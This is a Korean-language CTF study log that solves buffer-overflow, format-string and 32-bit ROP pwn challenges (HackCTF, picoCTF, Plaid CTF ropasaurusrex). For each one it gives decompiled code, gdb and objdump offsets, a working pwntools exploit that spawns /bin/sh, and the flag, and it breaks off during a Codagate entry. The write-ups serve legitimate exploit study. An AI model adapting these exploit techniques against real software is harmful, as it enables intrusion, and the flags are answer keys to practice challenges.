{<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>Yeah dude! You win!<span class="pl-cce">\n</span>Opening your shell…<span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">“</span>/bin/dash<span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>Shell closed! Bye.<span class="pl-pds">“</span></span>);<br>  }<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><p><strong>따로 .c 파일이 주어지지 않아 IDA를 이용해서 코드로 변환해보니, v5의 값이 <code>0xDEADBEEF</code>면 system 함수를 호출하는 것을 볼 수 있습니다. 이번 문제도 BOF를 이용해서 v5의 값을 <code>0xDEADBEEF</code>로 바꿔주면 될 거 같습니다.</strong><br></p><pre><code>v5  = 34h - Chv5 = 40</code></pre><p><strong>v5는 s와 40만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3000</span>)<p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">b’a’</span> <span class="pl-c1">*</span> (<span class="pl-c1">52</span> <span class="pl-c1">-</span> <span class="pl-c1">12</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0xDEADBEEF</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><blockquote><p>FLAG : HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}</p></blockquote><hr><p>HackCTF Challenge : Basic_BOF #2</p><div class="highlight highlight-source-c"><pre><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp){  <span class="pl-k">char</span> s; <span class="pl-c"><span class="pl-c">//</span> [esp+Ch] [ebp-8Ch]</span>  <span class="pl-c1">void</span> (*v5)(<span class="pl-k">void</span>); <span class="pl-c"><span class="pl-c">//</span> [esp+8Ch] [ebp-Ch]</span><p>  v5 = (<span class="pl-c1">void</span> (*)(<span class="pl-k">void</span>))sup;<br>  <span class="pl-c1">fgets</span>(&amp;s, <span class="pl-c1">133</span>, stdin);<br>  <span class="pl-c1">v5</span>();<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</p><p>(…)</p><p><span class="pl-k">int</span> <span class="pl-en">shell</span>()<br>{<br>  <span class="pl-k">return</span> <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">“</span>/bin/dash<span class="pl-pds">“</span></span>);<br>}</p><p><span class="pl-c"><span class="pl-c">//</span> shell addr : 0x804849B</span></pre></div></p><p><strong>1번과 마찬가치로 IDA를 이용해서 코드로 변환해주었습니다. 코드를 보니 문자열 변수 s와 함수 포인터 v5를 정의하는 것을 볼 수 있습니다. 그리고 마지막에는 v5 함수를 호출하고 있습니다. BOF 취약점을 이용해서 v5 포인터 변수의 값으로 shell 함수의 주소를 넣어주면 v5 함수를 호출 할 때 shell 함수가 호출이 될 것 입니다.</strong><br></p><pre><code>*v5 = 8Ch - Ch*v5 = 128</code></pre><p><strong>*v5는 s와 128만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3001</span>)<p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">b’a’</span> <span class="pl-c1">*</span> <span class="pl-c1">128</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0x804849B</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><blockquote><p>FLAG : HackCTF{h3y_dud3_600d_f0r_y0u}</p></blockquote><hr><p>HackCTF Challenge : Basic_FSB</p><div class="highlight highlight-source-c"><pre><span class="pl-c"><span class="pl-c">//</span> main</span><p><span class="pl-k">int</span> __cdecl <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">const</span> <span class="pl-k">char</span> **argv, <span class="pl-k">const</span> <span class="pl-k">char</span> **envp)<br>{<br>  <span class="pl-c1">setvbuf</span>(stdout, <span class="pl-c1">0</span>, <span class="pl-c1">2</span>, <span class="pl-c1">0</span>);<br>  <span class="pl-c1">vuln</span>();<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</pre></div></p><div class="highlight highlight-source-c"><pre><span class="pl-c"><span class="pl-c">//</span> vuln</span><p><span class="pl-k">int</span> <span class="pl-en">vuln</span>()<br>{<br>  <span class="pl-k">char</span> s; <span class="pl-c"><span class="pl-c">//</span> [esp+0h] [ebp-808h]</span><br>  <span class="pl-k">char</span> format; <span class="pl-c"><span class="pl-c">//</span> [esp+400h] [ebp-408h]</span></p><p>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>input : <span class="pl-pds">“</span></span>);<br>  <span class="pl-c1">fgets</span>(&amp;s, <span class="pl-c1">1024</span>, stdin);<br>  <span class="pl-c1">snprintf</span>(&amp;format, <span class="pl-c1">0x400u</span>, &amp;s);<br>  <span class="pl-k">return</span> <span class="pl-c1">printf</span>(&amp;format);<br>}</pre></div></p><div class="highlight highlight-source-c"><pre><span class="pl-c"><span class="pl-c">//</span> flag()</span><p><span class="pl-k">int</span> <span class="pl-en">flag</span>()<br>{<br>  <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>EN)you have successfully modified the value :)<span class="pl-pds">“</span></span>);<br>  <span class="pl-c1">puts</span>(aKr);<br>  <span class="pl-k">return</span> <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">“</span>/bin/sh<span class="pl-pds">“</span></span>);<br>}</pre></div></p><p><strong>IDA를 이용해서 코드로 변환을 해주었습니다. main 함수를 보면 vuln 함수를 호출하고 있고, vulln 함수를 보면 snprintf 함수에서 두 번째 매개변수로 서식 문자가 정의되어 있지 않아 FSB 취약점이 발생합니다. 그래서 FSB 취약점을 이용해서 printf 함수의 got를 flag 함수의 주소로 덮어주면 printf 함수가 실행될 때, flag 함수가 실행이 될 것 입니다.</strong><br></p><pre><code>root@py:~/pwn/HackCTF/B_F# ./basic_fsbinput : aaaa.%x.%x.%x.%x.%xaaaa.f7fc5c75.61616161.2e78252e.252e7825.78252e78root@py:~/pwn/HackCTF/B_F#<p>// gdb -q ./basic_fsb<br>gdb-peda$ x/i 0x80483d0<br>   0x80483d0 &lt;printf@plt&gt;:      jmp    DWORD PTR ds:0x804a00c<br>gdb-peda$ p flag<br>$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x80485b4 &lt;flag&gt;<br>gdb-peda$<br></code></pre></p><p><strong>바이너리 파일을 실행해서 오프셋을 확인해보니 두 번째 서식 문자에서 <code>aaaa</code>의 값이 출력되는 것을 볼 수 있고, printf got, flag 함수의 주소는 위와 같습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">"ctf.j0n9hyun.xyz"</span>, <span class="pl-c1">3002</span>)<p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-en">fmtstr_payload</span>(<span class="pl-c1">2</span>, {<span class="pl-c1">0x804a00c</span>:<span class="pl-c1">0x80485b4</span>})</p><p><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</p><p><span class="pl-c"># 32 비트에서는 fmtstr_payload 함수를 이용해도 잘 되지만 64 비트에서는 거의 안 됨.</span><br><span class="pl-c"># 처음 풀 때 어려워 했는데 이해하고 다시 보니, webhacking.kr 1번 문제 느낌.</span></pre></div></p><blockquote><p>FLAG : HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?}</p></blockquote><hr><p>PicoCTF Challenge : authenticate</p><div class="highlight highlight-source-c"><pre>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdlib.h<span class="pl-pds">&gt;</span></span>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>string.h<span class="pl-pds">&gt;</span></span>#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>sys/types.h<span class="pl-pds">&gt;</span></span><p><span class="pl-k">int</span> authenticated = <span class="pl-c1">0</span>;</p><p><span class="pl-k">int</span> <span class="pl-en">flag</span>() {<br>  <span class="pl-k">char</span> flag[<span class="pl-c1">48</span>];<br>  FILE *file;<br>  file = <span class="pl-c1">fopen</span>(<span class="pl-s"><span class="pl-pds">“</span>flag.txt<span class="pl-pds">“</span></span>, <span class="pl-s"><span class="pl-pds">“</span>r<span class="pl-pds">“</span></span>);<br>  <span class="pl-k">if</span> (file == <span class="pl-c1">NULL</span>) {<br>    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">exit</span>(<span class="pl-c1">0</span>);<br>  }</p><p>  <span class="pl-c1">fgets</span>(flag, <span class="pl-k">sizeof</span>(flag), file);<br>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span><span class="pl-c1">%s</span><span class="pl-pds">“</span></span>, flag);<br>  <span class="pl-k">return</span> <span class="pl-c1">0</span>;<br>}</p><p><span class="pl-k">void</span> <span class="pl-en">read_flag</span>() {<br>  <span class="pl-k">if</span> (!authenticated) {<br>    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Sorry, you are not <em>authenticated</em>!<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>  }<br>  <span class="pl-k">else</span> {<br>    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Access Granted.<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">flag</span>();<br>  }</p><p>}</p><p><span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span> **argv) {</p><p>  <span class="pl-c1">setvbuf</span>(stdout, <span class="pl-c1">NULL</span>, _IONBF, <span class="pl-c1">0</span>);</p><p>  <span class="pl-k">char</span> buf[<span class="pl-c1">64</span>];</p><p>  <span class="pl-c"><span class="pl-c">//</span> Set the gid to the effective gid</span><br>  <span class="pl-c"><span class="pl-c">//</span> this prevents /bin/sh from dropping the privileges</span><br>  <span class="pl-c1">gid_t</span> gid = <span class="pl-c1">getegid</span>();<br>  <span class="pl-c1">setresgid</span>(gid, gid, gid);</p><p>  <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Would you like to read the flag? (yes/no)<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);</p><p>  <span class="pl-c1">fgets</span>(buf, <span class="pl-k">sizeof</span>(buf), stdin);</p><p>  <span class="pl-k">if</span> (<span class="pl-c1">strstr</span>(buf, <span class="pl-s"><span class="pl-pds">“</span>no<span class="pl-pds">“</span></span>) != <span class="pl-c1">NULL</span>) {<br>    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">“</span>Okay, Exiting…<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">exit</span>(<span class="pl-c1">1</span>);<br>  }<br>  <span class="pl-k">else</span> <span class="pl-k">if</span> (<span class="pl-c1">strstr</span>(buf, <span class="pl-s"><span class="pl-pds">“</span>yes<span class="pl-pds">“</span></span>) == <span class="pl-c1">NULL</span>) {<br>    <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">“</span>Received Unknown Input:<span class="pl-cce">\n</span><span class="pl-pds">“</span></span>);<br>    <span class="pl-c1">printf</span>(buf);<br>  }</p><p>  <span class="pl-c1">read_flag</span>();</p><p>}</pre></div></p><p><strong>main 함수 else if 문을 보면 printf 함수를 호출하는 데 이때 FSB 취약점이 발생합니다. 그리고 flag는 read_flag 함수에서 authenticated의 값이 참이면 flag 함수를 호출해서 flag를 출력해줍니다. 즉 전역 변수인 authenticated의 값을 FSB 취약점을 이용해서 참(1)으로 변조하면 됩니다.</strong><br></p><pre><code>root@py:~/pwn/picoCTF# ./authWould you like to read the flag? (yes/no)aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%xReceived Unknown Input:<p>aaaa.80489a6.f7ec1580.804875a.f7ec1000.ff992024.ff992028.ff9920f4.3.0.0.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.Sorry, you are not <em>authenticated</em>!<br></code></pre></p><p><strong>바이너리 파일을 이용해 오프셋을 확인해 보니 11인 것을 알 수 있었습니다.</strong><br></p><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><p><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">remote</span>(<span class="pl-s">“2018shell2.picoctf.com”</span>, <span class="pl-c1">52918</span>)<br><span class="pl-s1">e</span> <span class="pl-c1">=</span> <span class="pl-v">ELF</span>(<span class="pl-s">“./auth”</span>)<br><span class="pl-s1">auth</span> <span class="pl-c1">=</span> <span class="pl-s1">e</span>.<span class="pl-s1">sym</span>[<span class="pl-s">‘authenticated’</span>]</p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-en">fmtstr_payload</span>(<span class="pl-c1">11</span>, {<span class="pl-s1">auth</span>:<span class="pl-c1">1</span>})<br><span class="pl-s1">p</span>.<span class="pl-en">sendline</span>(<span class="pl-s1">payload</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><blockquote><p>FLAG : picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}</p></blockquote><hr><h2><a id="user-content-pwn-d2-20210126" class="anchor" aria-hidden="true" href="#pwn-d2-20210126"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PWN D+2 (2021.01.26)<br></h2><hr><p>Plaid CTF 2013 - Challenge : ropasaurusrex</p><p><strong>이번에 풀어 볼 문제는 Plaid CTF 2013에서 나온 32 bit ROP 문제입니다. 32 bit ROP를 이해하고, 풀어보니 포너블 뉴비분들은 재밌게 풀 수 있을 거 같습니다. 일단 IDA를 이용해서 바이너리를 코드로 변환 시켜 주겠습니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-c1">ssize_t</span> __cdecl <span class="pl-en">main</span>(){  <span class="pl-c1">sub_80483F4</span>();  <span class="pl-k">return</span> <span class="pl-c1">write</span>(<span class="pl-c1">1</span>, <span class="pl-s"><span class="pl-pds">"</span>WIN<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, <span class="pl-c1">4u</span>);}</pre></div><p><strong>main() 함수를 보면 sub_80483F4() 함수를 호출하고, <code>WIN</code>을 출력하고 끝나는 것을 볼 수 있습니다.</strong><br></p><div class="highlight highlight-source-c"><pre><span class="pl-c1">ssize_t</span> <span class="pl-en">sub_80483F4</span>(){  <span class="pl-k">char</span> buf; <span class="pl-c"><span class="pl-c">//</span> [esp+10h] [ebp-88h]</span><p>  <span class="pl-k">return</span> <span class="pl-c1">read</span>(<span class="pl-c1">0</span>, &amp;buf, <span class="pl-c1">0x100u</span>);<br>}</pre></div></p><p><strong>sub_80483F4() 함수를 보면 buf라는 변수를 정의하고, read 함수를 이용해서 buf의 입력 받고 있습니다. 하지만 buf의 크기는 88h인데 read() 함수에세ㅓ 100h 만큼 입력 받고 있기 때문에 BOF 취약점이 발생합니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ ./ropasaurusrex AAAAWINpocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ </code></pre><p><strong>위 결과는 바이너리 파일을 실행시킨 것 입니다. 입력을 받고, <code>WIN</code>을 출력함과 동시에 종료되는 것을 볼 수 있습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ checksec --file=ropasaurusrexRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable    FILENo RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No    0        1        ropasaurusrexpocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ </code></pre><p><strong>위 결과는 checksec를 이용해 보호 기법을 확인한 결과인데, 보면 NX Bit가 활성화 되어 있는 것을 볼 수 있습니다. NX Bit가 활성화 되어 있기 때문에 BOF 취약점을 이용해서 buf에 쉘코드를 삽입하고, ret에 buf를 준다고해도 실행 권한이 없어 실행되지 않을 것 입니다. 하지만 ROP를 이용해서 NX Bit를 우회해 익스를 진행할 수 있습니다.</strong><br></p><pre><code>gdb-peda$ disas readDump of assembler code for function read@plt:   0x0804832c &lt;+0&gt;:    jmp    DWORD PTR ds:0x804961c   0x08048332 &lt;+6&gt;:    push   0x18   0x08048337 &lt;+11&gt;:    jmp    0x80482ecEnd of assembler dump.gdb-peda$ disas writeDump of assembler code for function write@plt:   0x0804830c &lt;+0&gt;:    jmp    DWORD PTR ds:0x8049614   0x08048312 &lt;+6&gt;:    push   0x8   0x08048317 &lt;+11&gt;:    jmp    0x80482ecEnd of assembler dump.gdb-peda$<p>// read got  : 0x0804961c<br>// read plt  : 0x0804832c<br>// write got : 0x08049614<br>// write plt : 0x0804830c<br></code></pre></p><p><strong>gdb를 이용해서 read/write의 plt/got를 알아냈습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d ropasaurusrex | grep -B4 "ret"(생략)-- 80484b5:    5b                       pop    %ebx 80484b6:    5e                       pop    %esi 80484b7:    5f                       pop    %edi 80484b8:    5d                       pop    %ebp 80484b9:    c3                       ret     80484ba:    8b 1c 24                 mov    (%esp),%ebx 80484bd:    c3                       ret    --(생략)<p>// pop pop pop r : 0x080484b6<br></code></pre></p><p><strong>objdump를 이용해서 pppr을 알아냈습니다 pppr을 구하는 이유는 read/write 함수의 인자는 3개이기 때문입니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d /lib32/libc.so.6 | grep __read(생략)   df11b:    e8 00 65 00 00           call   e5620 &lt;__read@@GLIBC_2.0&gt;   df27a:    e8 a1 63 00 00           call   e5620 &lt;__read@@GLIBC_2.0&gt;   df42e:    e8 ed 61 00 00           call   e5620 &lt;__read@@GLIBC_2.0&gt;000e5620 &lt;__read@@GLIBC_2.0&gt;:   e5639:    75 1d                    jne    e5658 &lt;__read@@GLIBC_2.0+0x38&gt;   e564c:    77 52                    ja     e56a0 &lt;__read@@GLIBC_2.0+0x80&gt;   e5680:    77 28                    ja     e56aa &lt;__read@@GLIBC_2.0+0x8a&gt;(생략)pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d /lib32/libc.so.6 | grep system0003ce10 &lt;__libc_system@@GLIBC_PRIVATE&gt;:   3ce24:    74 0a                    je     3ce30 &lt;__libc_system@@GLIBC_PRIVATE+0x20&gt;00127030 &lt;svcerr_systemerr@@GLIBC_2.0&gt;:  12708b:    75 04                    jne    127091 &lt;svcerr_systemerr@@GLIBC_2.0+0x61&gt;pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$<p>// read offset   : 0xe5620<br>// system offset : 0x3ce24<br></code></pre></p><p><strong>objdump를 이용해서 read/system offset을 구했습니다. read offset은 libc의 주소를 릭 하는데 사용되고, system offset은 나중에 system 주소를 릭할 때 사용됩니다.</strong><br></p><pre><code>libc = read_addr - read_offsetsystem = libc + system_offset</code></pre><p><strong>위와 같이 read addr에서 read offset을 빼주면 libc의 시작 주소가 나올 것이고, libc에서 system offset 만큼 더해주면 system 함수의 시작 주소가 나올 것 입니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -h ropasaurusrex <p>ropasaurusrex:     file format elf32-i386</p><p>Sections:<br>Idx Name          Size      VMA       LMA       File off  Algn<br>(생략)<br> 24 .bss          00000008  08049628  08049628  00000628  2**2<br>                  ALLOC<br>(생략)<br></code></pre></p><p><strong>마지막으로 objdump를 이용해서 <code>/bin/sh</code>을 저장할 bss 영역의 주소를 알아냈습니다</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 호출해서 read 주소를 릭한다. read 주소랑 read offset이랑 빼서 libc의 시작 주소를 구하고, libc의 시작 주소에 system offset을 더해서 system의 시작 주소를 구한다.<br></li><li>read 함수를 호출해서 bss 영역에 <code>"/bin/sh"</code>을 넣어준다.</li><li>read 함수를 호출해서 read got의 system addr을 넣어준다.</li><li>read 함수를 호출하면 (3)에서 read got가 system addr로 덮였기 때문에 system 함수가 호출이 되고, 인자값으로는 bss를 넘겨준다. bss에는 <code>"/bin/sh"</code>가 들어있다.</li></ol><br><div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span><span class="pl-k">from</span> <span class="pl-s1">time</span> <span class="pl-k">import</span> <span class="pl-s1">sleep</span><p><span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-en">process</span>(<span class="pl-s">“./ropasaurusrex”</span>)</p><p><span class="pl-s1">read_plt</span> <span class="pl-c1">=</span> <span class="pl-c1">0x0804832c</span><br><span class="pl-s1">read_got</span> <span class="pl-c1">=</span> <span class="pl-c1">0x0804961c</span><br><span class="pl-s1">read_off</span> <span class="pl-c1">=</span> <span class="pl-c1">0xe5620</span><br><span class="pl-s1">write_plt</span> <span class="pl-c1">=</span> <span class="pl-c1">0x0804830c</span><br><span class="pl-s1">write_got</span> <span class="pl-c1">=</span> <span class="pl-c1">0x08049614</span><br><span class="pl-s1">pppr</span> <span class="pl-c1">=</span> <span class="pl-c1">0x080484b6</span><br><span class="pl-s1">dynamic</span> <span class="pl-c1">=</span> <span class="pl-c1">0x08049530</span><br><span class="pl-s1">system_off</span> <span class="pl-c1">=</span> <span class="pl-c1">0x3ce10</span> </p><p><span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">“A”</span> <span class="pl-c1">*</span> (<span class="pl-c1">136</span> <span class="pl-c1">+</span> <span class="pl-c1">4</span>) <span class="pl-c"># buffer + sfp</span></p><p><span class="pl-c"># 시나리오 (1)</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">write_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">1</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_got</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">4</span>)</p><p><span class="pl-c"># 시나리오 (2)</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">dynamic</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">8</span>)</p><p><span class="pl-c"># 시나리오 (3)</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">pppr</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_got</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">4</span>)</p><p><span class="pl-c"># 시나리오 (4)</span><br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">read_plt</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-c1">0x41414141</span>)<br><span class="pl-s1">payload</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">dynamic</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">send</span>(<span class="pl-s1">payload</span>)<br><span class="pl-en">sleep</span>(<span class="pl-c1">1</span>)</p><p><span class="pl-s1">readaddr</span> <span class="pl-c1">=</span> <span class="pl-en">u32</span>(<span class="pl-s1">p</span>.<span class="pl-en">recv</span>(<span class="pl-c1">4</span>))<br><span class="pl-s1">libc_base</span> <span class="pl-c1">=</span> <span class="pl-s1">readaddr</span> <span class="pl-c1">-</span> <span class="pl-s1">read_off</span><br><span class="pl-s1">system</span> <span class="pl-c1">=</span> <span class="pl-s1">libc_base</span> <span class="pl-c1">+</span> <span class="pl-s1">system_off</span><br><span class="pl-k">print</span> <span class="pl-en">hex</span>(<span class="pl-s1">libc_base</span>)<br><span class="pl-k">print</span> <span class="pl-en">hex</span>(<span class="pl-s1">system</span>)</p><p><span class="pl-s1">p</span>.<span class="pl-en">send</span>(<span class="pl-s">“/bin/sh”</span>)<br><span class="pl-s1">p</span>.<span class="pl-en">send</span>(<span class="pl-en">p32</span>(<span class="pl-s1">system</span>))<br><span class="pl-s1">p</span>.<span class="pl-en">interactive</span>()</pre></div></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ python exploit.py [+] Starting local process './ropasaurusrex': pid 86950xf7d6e0000xf7daae10[*] Switching to interactive mode$ iduid=1000(pocas) gid=1000(pocas) groups=1000(pocas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)$ cat keyyou_cant_stop_the_ropasaurusrex$  </code></pre><blockquote><p>FLAG : you_cant_stop_the_ropasaurusrex</p></blockquote><hr><h2><a id="user-content-pwn-d3-20210127" class="anchor" aria-hidden="true" href="#pwn-d3-20210127"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>PWN D+3 (2021.01.27)<br></h2><hr><p>Codagate 2017 Challenge : BabyPwn</p><p><strong>이번에는 Canary Leak + ROP를 이용한 문제를 풀어보겠습니다. 방금 Canary에 대해 공부를 하고, Canary 릭을 해서 푸는 문제가 없나 보니 코게 문제로 하나가 있어 풀어보겠습니다.</strong><br></p><pre><code>pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ checksec --file=babypwnRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY  